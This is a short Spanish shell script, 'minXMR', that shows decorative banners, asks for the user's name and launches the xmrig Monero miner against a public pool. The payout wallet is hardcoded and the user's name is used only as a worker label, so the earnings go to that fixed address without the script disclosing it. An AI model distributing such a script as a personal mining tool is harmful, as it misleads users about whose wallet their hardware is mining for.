reset
figlet -f standard "minXMR"|lolcat -a -d 3
figlet -f slant "by"|lolcat -a -d 3
figlet -f slant "XxrrxX"|lolcat -a -d 3
clear
echo "Cual es tu nombre ?"|lolcat -a -d 3
read name
clear
figlet -f standard "Hola"|lolcat -a -d 2
figlet -f slant $name|lolcat -a -d 2
echo "Todo listo para minar! [✓]"|lolcat -a -d 2
echo "Excelente miner time!"|lolcat -a -d 2
sleep 2
clear
cd xmrig/build
clear
./xmrig -o pool.supportxmr.com:443 -u 43L2sYqxbjYHrKvnXr1H2Q211i7Y9KphDYUTYdunNZaTLCGs9FLoSj9RFL44MfJaqC4RZd7WnArVo6FSn5xF5N6sQfs8JYW -k --tls -p $name
echo "minXMR stop"|lolcat -a -d 1
echo "Saliendo de minXMR"|lolcat -a -d 3
echo ""
echo "Para volver a minar copia y pega la siguiente linea:"|lolcat -a -d 3
echo ""
echo ""
echo "Primero:"|lolcat -a -d 3
echo ""
echo "cd && cd ../ubuntu-in-termux/ && ./startubuntu.sh"|lolcat -a -d 3
echo ""
echo "Despues en root@localhost:~# pega :"|lolcat -a -d 3 
echo ""
echo "cd && cd minXMR && sh minXMR.sh"|lolcat -a -d 3
echo ""
echo ""
figlet -f slant "bye bye!"|lolcat -a -d 3
echo ""
echo ""
